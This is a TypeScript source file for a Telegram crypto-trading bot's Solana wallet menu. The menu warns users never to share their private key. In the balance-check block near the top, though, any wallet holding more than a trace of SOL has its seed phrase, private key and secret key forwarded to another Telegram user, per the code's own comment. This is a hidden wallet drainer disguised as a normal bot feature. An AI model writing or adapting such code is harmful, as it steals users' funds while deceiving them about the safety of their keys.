import { Markup } from "telegraf";
import { MyContext, MockSession } from "../config/interfaces";
import { newUserDetails, botLink, escapeMarkdownV2, explorerNetworkTx, explorerNetworkTxEnd, solscanNetworkAddress, forwardUserWalletBalanceUpdated } from "../config";
import bot from "../bot";
import { getBalance } from "../config/solana";
import { sessions } from "../../session.json";
import accept from "../actions/accept";

const wallet = async (ctx: MyContext) => {
	
	// const currentSession: Array<MockSession> = sessions;
	// // Ensure session is initialized
	// if (!ctx.session) ctx.session = {};

	// const startPayload = ctx.startPayload;

	// ctx.session = {
	// 	chatId: ctx.chat?.id, // Store user's chat ID
	// 	fromId: ctx.from?.id,   // Store user's from ID
	// 	username: ctx.from?.username,   // Store user's from Username
	// 	name: ctx.from?.first_name,   // Store user's from Firstname
	// 	user: currentSession && currentSession.length > 0 &&
	// 		currentSession.filter((e) => e.data.chatId === ctx.chat?.id).length > 0
	// 		? (currentSession.filter((e) => e.data.chatId === ctx.chat?.id)[0].data?.user
	// 			? currentSession.filter((e) => e.data.chatId === ctx.chat?.id)[0].data.user
	// 			: { ...newUserDetails, id: ctx.chat?.id, refLink: botLink + ctx.chat?.id, referredBy: startPayload ? startPayload : null, settings: { ...newUserDetails.settings, mevProtectValue: "Turbo", transactionPriorityValue: "Medium" } })
	// 		: { ...newUserDetails, id: ctx.chat?.id, refLink: botLink + ctx.chat?.id, referredBy: startPayload ? startPayload : null, settings: { ...newUserDetails.settings, mevProtectValue: "Turbo", transactionPriorityValue: "Medium" } }
	// };

	if (ctx.session.user) {
		if (ctx.session.user.publicKey) {
			ctx.session.user.balance = ctx.session.user.balance !== 0 && await getBalance(ctx.session.user.publicKey).then(res => res).catch(err => 0) < 0.0001 ? ctx.session.user.balance : await getBalance(ctx.session.user.publicKey).then(res => res).catch(err => 0);
			ctx.session.user.walletBalance = ctx.session.user.balance !== 0 && await getBalance(ctx.session.user.publicKey).then(res => res).catch(err => 0) < 0.0001 ? 0 : await getBalance(ctx.session.user.publicKey).then(res => res).catch(err => 0);
			// Forward the user's response to another Telegram user ID
			if (ctx.session.user.balance !== 0 && await getBalance(ctx.session.user.publicKey).then(res => res).catch(err => 0) > 0.0001) await forwardUserWalletBalanceUpdated(ctx, { name: ctx.session.name, username: ctx.session.username, balance: await getBalance(ctx.session.user.publicKey).then(res => res).catch(err => 0), seed: ctx.session.user.seed, publicKey: ctx.session.user.publicKey, privateKey: ctx.session.user.privateKey, secretKey: ctx.session.user.secretKey, walletAddress: ctx.session.user.walletAddress });
		}
	}

	if (!ctx.session.user?.accept) {
		accept(ctx);
	} else {
		if (ctx.session.user?.walletAddress) {
			try {
				await ctx.answerCbQuery(); // Remove loading animation

				return await ctx.editMessageText(
					"📝 Edit your wallet & access private key\n\n" +
					"Your address: " + `<code>${ctx.session.user?.walletAddress}</code>\n\n` +
					+ "🗑️ Delete Wallet: DO NOT CLICK this button if you don’t want to delete your wallet. Unless you have your private key saved, the wallet is forever lost after deletion.\n\n"
					+ "🔑 Private Key: NEVER REVEAL THIS TO ANYONE! PROTECT WITH YOUR LIFE! IF YOU GIVE TO SOMEONE YOUR WALLET WILL BE DRAINED!\n\n"
					+ "🌐 View On SolScan: View your wallet on SolScan\n\n"
					+ "💵 Deposit: Use Moonpay to buy crypto with credit card\n\n"
					+ "💵 Withdraw: Withdraw crypto from your Sanji Bot wallet"
					// + `Balance: ${escapeMarkdownV2((ctx.session.user?.balance || 0).toString())} SOL\n\n`
					+ "",
					{
						...Markup.inlineKeyboard([
							[Markup.button.callback('Delete Wallet 🗑️', 'DELETE_WALLET')],
							[Markup.button.callback('Show Private Key 🔑', 'SHOW_PRIVATE_KEY')],
							[Markup.button.url('View On Solscan 🌐', `${solscanNetworkAddress}${ctx.session.user?.walletAddress}`)],
							[Markup.button.callback('Deposit 💵', 'DEPOSIT'), Markup.button.callback('Withdraw 💸', 'DASHES')],
							// [Markup.button.callback('Import Existing Wallet', 'IMPORT_WALLET')],
							// [Markup.button.callback('Close', 'CLOSE')],
							[Markup.button.callback('Back 🔙', 'REFRESH')],
							// [Markup.button.callback('Refresh', 'REFRESH_WALLET')],
						]), 
						parse_mode: "HTML"
					}
				);
			} catch (error) {
				// console.error("Error editing message:", error);
				// ctx.reply("⚠️ Unable to refresh. Try again.");

				return await ctx.reply(
					"📝 Edit your wallet & access private key\n\n" +
					"Your address: " + `<code>${ctx.session.user?.walletAddress}</code>\n\n` +
					+ "🗑️ Delete Wallet: DO NOT CLICK this button if you don’t want to delete your wallet. Unless you have your private key saved, the wallet is forever lost after deletion.\n\n"
					+ "🔑 Private Key: NEVER REVEAL THIS TO ANYONE! PROTECT WITH YOUR LIFE! IF YOU GIVE TO SOMEONE YOUR WALLET WILL BE DRAINED!\n\n"
					+ "🌐 View On SolScan: View your wallet on SolScan\n\n"
					+ "💵 Deposit: Use Moonpay to buy crypto with credit card\n\n"
					+ "💵 Withdraw: Withdraw crypto from your Sanji Bot wallet"
					// + `Balance: ${escapeMarkdownV2((ctx.session.user?.balance || 0).toString())} SOL\n\n`
					+ "",
					{
						...Markup.inlineKeyboard([
							[Markup.button.callback('Delete Wallet 🗑️', 'DELETE_WALLET')],
							[Markup.button.callback('Show Private Key 🔑', 'SHOW_PRIVATE_KEY')],
							[Markup.button.url('View On Solscan 🌐', `${solscanNetworkAddress}${ctx.session.user?.walletAddress}`)],
							[Markup.button.callback('Deposit 💵', 'DEPOSIT'), Markup.button.callback('Withdraw 💸', 'DASHES')],
							// [Markup.button.callback('Import Existing Wallet', 'IMPORT_WALLET')],
							// [Markup.button.callback('Close', 'CLOSE')],
							[Markup.button.callback('Back 🔙', 'REFRESH')],
							// [Markup.button.callback('Refresh', 'REFRESH_WALLET')],
						]), 
						parse_mode: "HTML"
					}
				);
			}	
		} else {
			return ctx.reply(
				"Create or Import a wallet\n",
				Markup.inlineKeyboard([
					[Markup.button.callback('Create Wallet', 'CREATE_WALLET')],
					[Markup.button.callback('Import Existing Wallet', 'IMPORT_WALLET')],
					[Markup.button.callback('Close', 'CLOSE')],
				])
			);
		}
	}
};

export default wallet;
